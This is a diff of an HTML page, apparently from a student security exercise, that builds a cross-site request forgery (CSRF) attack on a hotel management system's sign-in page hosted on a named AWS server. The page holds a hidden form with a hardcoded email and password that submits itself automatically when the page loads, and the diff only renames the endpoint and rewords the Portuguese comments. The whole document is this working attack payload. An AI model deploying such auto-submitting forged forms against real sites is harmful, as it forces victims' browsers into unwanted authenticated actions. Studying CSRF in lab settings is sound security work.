@@ -2,20 +2,20 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8">
-    <title>CSRF Login Attack</title>
+    <title>CSRF Sign-In Attack</title>
   </head>
   <body>
-    <h1>CSRF Login Simulation</h1>
+    <h1>CSRF Sign-In Simulation - Hotel Management System</h1>
 
-    <!-- Formulário oculto que será enviado automaticamente -->
-    <form id="csrfForm" action="http://ec2-44-201-230-80.compute-1.amazonaws.com/hotel-mgmt-system/login.php" method="POST">
+    <!-- Formulário oculto para ataque CSRF -->
+    <form id="csrfForm" action="http://ec2-44-201-230-80.compute-1.amazonaws.com/hotel-mgmt-system/sign-in.php" method="POST">
       <input type="hidden" name="loginEmail" value="rab2@cesar.school">
-      <input type="hidden" name="loginPassword" value="12345678"> <!-- Supõe uma senha -->
+      <input type="hidden" name="loginPassword" value="12345678"> <!-- Supondo uma senha válida -->
       <input type="hidden" name="loginSubmitBtn" value="Sign in">
     </form>
 
     <script>
-      // Envia o formulário automaticamente ao carregar a página
+      // Enviar automaticamente o formulário ao carregar a página
       window.onload = function() {
         document.getElementById('csrfForm').submit();
       };
